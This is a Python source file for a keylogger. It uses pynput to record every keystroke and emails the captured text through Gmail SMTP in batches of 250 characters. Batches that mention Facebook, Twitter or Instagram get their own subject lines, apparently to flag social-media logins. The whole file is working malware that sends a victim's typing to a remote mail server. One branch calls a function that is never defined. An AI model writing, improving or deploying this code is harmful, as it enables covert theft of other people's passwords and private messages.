import smtplib
from pynput.keyboard import Key, Listener

email = input("Enter your Email")
password = input("Enter your Password")
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

full_log = ''
choto_full_log = ''
word = ''
special_mail = ''
email_char_limit = 250


def on_press(key):
    global word
    global full_log
    global choto_full_log
    global email
    global email_char_limit

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        choto_full_log += word
        #print(word)
        if len(full_log) >= email_char_limit:
            if "facebook " in full_log:
                special_F_log()
                full_log = ''
                #print("yes")
            elif "twitter " in full_log:
                special_T_log()
                full_log = ''
            elif "instagram " in full_log:
                special_I_log()
                full_log = ''
            elif "cats " in full_log:
                special_CATs_log()
                full_log = ''
            else:
                send_log()
                full_log = ''
        word = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False


def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )


def special_F_log():
    subjectF = 'facebook'
    messageF = 'Subject: {}\n\n{}'.format(subjectF, full_log)

    server.sendmail(
        email,
        email,
        messageF
    )


def special_T_log():
    subjectT = 'Twitter'
    messageT = 'Subject: {}\n\n{}'.format(subjectT, full_log)

    server.sendmail(
        email,
        email,
        messageT
    )


def special_I_log():
    subjectI = 'Instagram'
    messageI = 'Subject: {}\n\n{}'.format(subjectI, full_log)

    server.sendmail(
        email,
        email,
        messageI
    )


with Listener(on_press=on_press) as listener:
    listener.join()
